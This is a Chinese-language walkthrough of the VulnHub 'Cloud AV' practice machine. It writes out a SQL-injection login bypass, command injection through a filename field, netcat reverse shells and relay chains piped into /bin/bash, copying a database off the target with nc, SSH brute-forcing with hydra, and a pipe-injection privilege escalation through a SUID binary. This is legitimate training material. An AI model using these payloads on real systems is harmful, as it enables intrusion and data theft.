## 靶场链接

https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/

## 信息收集

练习1用了`arp-scan`，这种工具有可能会被防火墙流量监测到，所以可以使用`arping`, 这种工具基本`Linux`发行版都会自带。

```shell
for i in $(seq 1 255);do sudo arping -c 2 192.168.31.$i;done
```

根据回包来判断靶机地址。

下一步，扫描端口和服务。

```shell
sudo nmap -p- 192.168.31.197

sudo nmap -p22.8080 192.168.31.197
```

扫描到有`ssh`和`http`服务， `web`服务使用`Python`写的框架。

![](https://cos.kevinc.ltd/file/download?fileId=493)

![](https://cos.kevinc.ltd/file/download?fileId=494)

## 漏洞利用

访问Web服务，出现搜索框要求输入邀请码，有两种思路，暴破和注入。

![](https://cos.kevinc.ltd/file/download?fileId=495)

注入的小技巧：先对所有键盘输入的特殊字符进行暴破，若存在状态码和回包长度不一致的，很有可能可以用于构造闭合语句。

![](https://cos.kevinc.ltd/file/download?fileId=496)

![](https://cos.kevinc.ltd/file/download?fileId=497)

回包显示网页使用了`Flask`框架，且明确显示了数据库查询语句。

![](https://cos.kevinc.ltd/file/download?fileId=498)

尝试使用万能密码

```shell
" or 1=1--+
```

顺利登录，返回一个病毒扫描页面。文本框要求输入一个文件名称，逻辑一般是文件名拼接扫描命令，可以尝试命令执行。

![](https://cos.kevinc.ltd/file/download?fileId=499)

```shell
hello | ls
```

网页顺利回显了文件列表，证明了命令执行的存在。此时可以尝试写入反弹shell，因为框架使用`Python`写的，可以使用`Python`的反弹shell。 如果靶机环境存在  `netcat`, 也可以利用 `nc` 构建反弹shell。

```shell
# kali

nc -nvlp 4444

# 文本框

nc 192.168.31.157 4444 -e /bin/bash
```

监听端口后无回显，可能是因为靶机环境的 `netcat` 版本过低，并不支持 `-e` 参数。

将之删掉后，显示连接已建立。

![](https://cos.kevinc.ltd/file/download?fileId=500)

此时要用到的小技巧叫 `nc`串联：靶机反向连接 `kali` , 通过管道符将输入的命令传入 `/bin/bash`，然后再通过管道符将结果反向输出到 `kali` 的另一个端口上。

```shell
hello | nc 192.168.31.157 3333 | /bin/bash | nc 192.168.31.157 4444
```

![](https://cos.kevinc.ltd/file/download?fileId=501)

此时`kali`终端中左侧输入的命令，执行后结果在右侧可显示输出。

## 提权

查看一下文件权限和文件列表，除了数据库文件外，其他文件对提权并没有作用。使用`file database.sql`得到数据库是 `sqlites`，该数据库是本地数据库，然而靶机环境中并没有读取数据库的工具，所以要把它传输到`kali`中读取。

```shell
# kali

nc -nvlp 5555 > db.sql

# 靶机

nc 192.168.31.157 5555 < database.sql
```

传输完成后使用`kali` 的 `sqlite3` 工具进行数据库文件的读取。

![](https://cos.kevinc.ltd/file/download?fileId=502)

发现数据库中都是密码字段，同时在靶机上`cat /etc/passwd`可以获取用户字段，我们可以用这些信息各自构造一个字段来对靶机的`ssh` 服务进行暴破。

```shell
hydra -L usr.txt -P pass.txt ssh://192.168.31.197
```

![](https://cos.kevinc.ltd/file/download?fileId=504)

暴破并不成功，寻找另外一种思路。使用`pwd`看看当前目录，本目录下没有其他线索可用了，退到上一级目录看看。

通过文件列表，可以看到有一个可执行文件具有`suid`权限，且据推测应该由该目录下一个`.c`文件编译而来。

![](https://cos.kevinc.ltd/file/download?fileId=505)

通过查看`.c`文件可以看到，该文件的功能是对`cloudav`进行升级，且命令后带一个参数，可以利用`suid`尝试在参数上构造管道拼接提权。

```shell
./update_cloudav "a|nc 192.168.31.57 5555| /bin/bash | nc 192.168.31.157 6666 
```

同时在`kali`上监听这两个端口，可以发现提权成功。

![](https://cos.kevinc.ltd/file/download?fileId=506)